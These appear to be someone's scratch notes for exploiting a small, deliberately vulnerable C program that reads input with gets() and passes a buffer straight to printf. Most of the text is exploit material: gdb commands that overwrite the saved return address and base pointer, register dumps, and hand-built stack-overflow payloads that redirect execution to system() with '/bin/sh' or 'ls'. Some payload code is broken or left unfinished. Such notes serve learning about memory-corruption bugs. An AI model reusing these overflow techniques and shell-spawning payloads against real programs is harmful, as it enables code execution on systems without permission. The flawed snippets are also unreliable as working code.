### INFO DUMP
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ZERO (123 == 321)

/*
saved rip = 0xffffcbe8 -> 0x180049b8d (8 bytes)
rip = 0x1004010e0
saved rbp = 0xffffcbe0 -> 0xffffcd30
a[10] = 0xffffcbd6
b[70] = 0xffffcb90 -> 0xffffcbd6a
text[64] = 0xffffcb50 -> 0xffffcb90

rbp @ ffffcbe0 -> 0xffffcd30 0x00000000
rsp @ ffffcb30

&main = 0x100401080/0x100401090
target_addr = 0x1004010e0

maybe 0x1004010d0?
0x1004010be/c4

&IlikeTOnameVARIABLESlikeTHIS = 0x100402010

try 1
set variable a = "ls"
set *0xffffcbe8 = 0x004010e0
try 2 -> set rbp to iliketo... + 0xa = 10040201a??
~~set 0xffffcbd6 = 0x00402010 0x01~~
set variable a = "ls"
set *0xffffcbd6 = 0x0000736c
set *0xffffcbda = 0x00000000
set *0xffffcbde = 0x45d00000

set a
set variable a = "/bin/sh"

set rip
set *0xffffcbe8 = 0x004010e0
set *0xffffcbec = 0x00000001 -> 0x004010e0 0x00000001

set rbp
set *0xffffcbe0 = 0xffffcbe0
set *0xffffcbe4 = 0x00000000 -> 0xffffcbe0


│B+>0x1004010e0 <main+96>   lea    -0xa(%rbp),%rax                                                                              │
│   0x1004010e4 <main+100>  mov    %rax,%rcx                                                                                         │
│   0x1004010e7 <main+103>  call   0x100401280 <system>  

original
Stack level 0, frame at 0xffffcbf0:
 rip = 0x1004010e0 in main (improper.c:14); saved rip = 0x180049b8d
 source language c.
 Arglist at 0xffffcbe0, args:
 Locals at 0xffffcbe0, Previous frame's sp is 0xffffcbf0
 Saved registers:
  rbp at 0xffffcbe0, rip at 0xffffcbe8
rax            0xffffcbdb          4294953947
rbx            0x80004b9f0         34360048112
rcx            0xffffcbd6          4294953942
rdx            0x5                 5
rsi            0x20                32
rdi            0xa                 10
rbp            0xffffcbe0          0xffffcbe0
rsp            0xffffcb30          0xffffcb30
r8             0xfefefefeff6d7372  -72340172830837902
r9             0x8080808080808080  -9187201950435737472
r10            0xfefefefefefefeff  -72340172838076673
r11            0x1004010b0         4299165872
r12            0xffffcc30          4294954032
r13            0xffffcc40          4294954048
r14            0x1                 1
r15            0x0                 0
rip            0x1004010e0         0x1004010e0 <main+96>
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x53                83
gs             0x2b                43

edited
Stack level 0, frame at 0xffffcbf0:
 rip = 0x1004010e0 in main (improper.c:14); saved rip = <not saved>
 Outermost frame: previous frame identical to this frame (corrupt stack?)
 source language c.
 Arglist at 0xffffcbe0, args:
 Locals at 0xffffcbe0, Previous frame's sp is 0xffffcbf0
 Saved registers:
  rbp at 0xffffcbe0, rip at 0xffffcbe8
rax            0x0                 0
rbx            0x80004b9f0         34360048112
rcx            0x800018040         34359836736
rdx            0x0                 0
rsi            0x20                32
rdi            0xa                 10
rbp            0xffffcbe0          0xffffcbe0
rsp            0xffffcbf0          0xffffcbf0
r8             0xffffcafc          4294953724
r9             0x0                 0
r10            0x100000000         4294967296
r11            0x1004011e3         4299166179
r12            0xffffcc30          4294954032
r13            0xffffcc40          4294954048
r14            0x1                 1
r15            0x0                 0
rip            0x1004010e0         0x1004010e0 <main+96>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x53                83
gs             0x2b                43
*/
int main() {
  printf("This is me --> "); //
  fflush(stdout);

  char a[10] = "hostn";
  strcat(a, "ame");
  system(a);

  system("id");

  char b[70] = "You want this power right?";
  strncat(b, "Too bad you can't :P\n", 50);

  printf("^ the all and mighty powerful user\n");
  printf(b);

  printf("\n\nTalk back at me if you want :PPPP\n");
  fflush(stdout);
  char text[64];
  gets(text);

  return 1;
}

char IlikeTOnameVARIABLESlikeTHIS[] = "/bin/sh";
```
overflow:
```py
command = b"ls -a\0"
payload = b"T" * 64 + b"b" * 70 + command + b"\0" * (10 - len(command)) + bytes.fromhex(0xffffcd30) + b"\0" * 4 + bytes.fromhex(0x80049b8d) + b"\x00\x00\x00\x01"
```



- we have to modify $rsi to jump to 0x1004010e0, skipping the hardcoded hostname
- rbp must be in sync with rsp. rbp can be buffer attacked but not rsp.

```
second frame: without editing old rbp/rsp
rbp: 0xffffcbe0
rip: 0xffffcbe8
a: 0xffffcbd6

rip: 0xffffcd38
rbp: 0xffffcd30
a: 0xffffcd26

- set rip
set *0xffffcbe8 = 0x004010e0
set *0xffffcbec = 0x00000001

- set a /bin/sh
set *0xffffcd26 = 0x6e69622f
set *0xffffcd2e = 0x0068732f
set *0xffffcd2e = 0xcd30[0000]

- set a ls
set *0xffffcd26 = 0x0000736c
set *0xffffcd2e = 0x00000000
set *0xffffcd36 = 0xcd30[0000]
```



full payload
```
text_part = b"T" * 64
b_part = b"B" * 70
a_part = b"A" * 10
rbp = b"\xff\xff\xcd\x30" + b"\x00\x00\x00\x00"
rip = b"\x00\x40\x10\xe0" + b"\x00\x00\x00\x01"

garbage = 
"\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x80\x04\x9b\x21" + "\x00\x00\x00\x01" +
"\xff\xff\xcc\x40" + "\x00\x00\x00\x00" + "\x00\x00\x00\x02" + "\x00\x00\x00\x00" +
"\x80\x32\x2f\xc0" + "\x00\x00\x00\x01" + "\xff\xff\xff\xb5" + "\xff\xff\xff\xff" +
"\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x80\x22\x48\x60" + "\x00\x00\x00\x01" +
"\x00\x04\xb9\xa0" + "\x00\x00\x00\x08" + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" +
"\x55\x5c\x3a\x43" + "\x73\x72\x65\x73" + "\x5f\x6f\x6e\x5c" + "\x63\x61\x70\x73" +

-- bin sh
b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" +
b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" +
b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" +
b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x00\x61\x61\x61" +
b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" +
b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" +
b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" +
b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" +
b"\x62\x62\x62\x62" + b"\x6f\x68\x00\x62" + b"\x61\x6e\x74\x73" + b"\x00\x00\x65\x6d" +
b"\xff\xff\xcd\x30" + b"\x00\x00\x00\x00" + b"\x80\x04\x9b\x8d" + b"\x00\x00\x00\x01" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x80\x04\x9b\x21" + b"\x00\x00\x00\x01" +
b"\xff\xff\xcc\x40" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x02" + b"\x00\x00\x00\x00" +
b"\x80\x32\x2f\xc0" + b"\x00\x00\x00\x01" + b"\xff\xff\xff\xb5" + b"\xff\xff\xff\xff" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x80\x22\x48\x60" + b"\x00\x00\x00\x01" +
b"\x00\x04\xb9\xa0" + b"\x00\x00\x00\x08" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x55\x5c\x3a\x43" + b"\x73\x72\x65\x73" + b"\x5f\x6f\x6e\x5c" + b"\x63\x61\x70\x73" +
b"\x65\x44\x5c\x65" + b"\x6f\x74\x6b\x73" + b"\x73\x63\x5c\x70" + b"\x37\x30\x31\x32" +
b"\x73\x73\x61\x5f" + b"\x68\x5c\x32\x67" + b"\x2d\x64\x72\x61" + b"\x72\x70\x6d\x69" +
b"\x72\x65\x70\x6f" + b"\x64\x6f\x63\x20" + b"\x6d\x69\x5c\x65" + b"\x70\x6f\x72\x70" +
b"\x2e\x33\x72\x65" + b"\x00\x65\x78\x65" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x30" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x0a" + b"\x01\x00\x00\x00" +
b"\xff\xff\xcc\x40" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x80\x34\xa5\xa8" + b"\x00\x00\x00\x01" +
b"\x80\x34\x54\x08" + b"\x00\x00\x00\x01" + b"\x00\x00\x00\x01" + b"\x00\x00\x00\x00" +
b"\xff\xff\xce\x00" + b"\x00\x00\x00\x00" + b"\x80\x04\x5f\x53" + b"\x00\x00\x00\x01" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x62\x2f\x00\x00" + b"\x73\x2f\x6e\x69" + b"\x00\x00\x00\x68"

-- ls payload

b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" +
b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" +
b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" +
b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x61\x61\x61\x61" + b"\x00\x61\x61\x61" +
b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" +
b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" +
b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" +
b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" + b"\x62\x62\x62\x62" +
b"\x62\x62\x62\x62" + b"\x6f\x68\x00\x62" + b"\x61\x6e\x74\x73" + b"\x00\x00\x65\x6d" +
b"\xff\xff\xcd\x30" + b"\x00\x00\x00\x00" + b"\x80\x04\x9b\x8d" + b"\x00\x00\x00\x01" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x80\x04\x9b\x21" + b"\x00\x00\x00\x01" +
b"\xff\xff\xcc\x40" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x02" + b"\x00\x00\x00\x00" +
b"\x80\x32\x2f\xc0" + b"\x00\x00\x00\x01" + b"\xff\xff\xff\xb5" + b"\xff\xff\xff\xff" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x80\x22\x48\x60" + b"\x00\x00\x00\x01" +
b"\x00\x04\xb9\xa0" + b"\x00\x00\x00\x08" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x55\x5c\x3a\x43" + b"\x73\x72\x65\x73" + b"\x5f\x6f\x6e\x5c" + b"\x63\x61\x70\x73" +
b"\x65\x44\x5c\x65" + b"\x6f\x74\x6b\x73" + b"\x73\x63\x5c\x70" + b"\x37\x30\x31\x32" +
b"\x73\x73\x61\x5f" + b"\x68\x5c\x32\x67" + b"\x2d\x64\x72\x61" + b"\x72\x70\x6d\x69" +
b"\x72\x65\x70\x6f" + b"\x64\x6f\x63\x20" + b"\x6d\x69\x5c\x65" + b"\x70\x6f\x72\x70" +
b"\x2e\x33\x72\x65" + b"\x00\x65\x78\x65" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x30" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x0a" + b"\x01\x00\x00\x00" +
b"\xff\xff\xcc\x40" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x80\x34\xa5\xa8" + b"\x00\x00\x00\x01" +
b"\x80\x34\x54\x08" + b"\x00\x00\x00\x01" + b"\x00\x00\x00\x01" + b"\x00\x00\x00\x00" +
b"\xff\xff\xce\x00" + b"\x00\x00\x00\x00" + b"\x80\x04\x5f\x53" + b"\x00\x00\x00\x01" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
b"\x00\x00\x00\x00" + b"\x73\x6c\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" 
```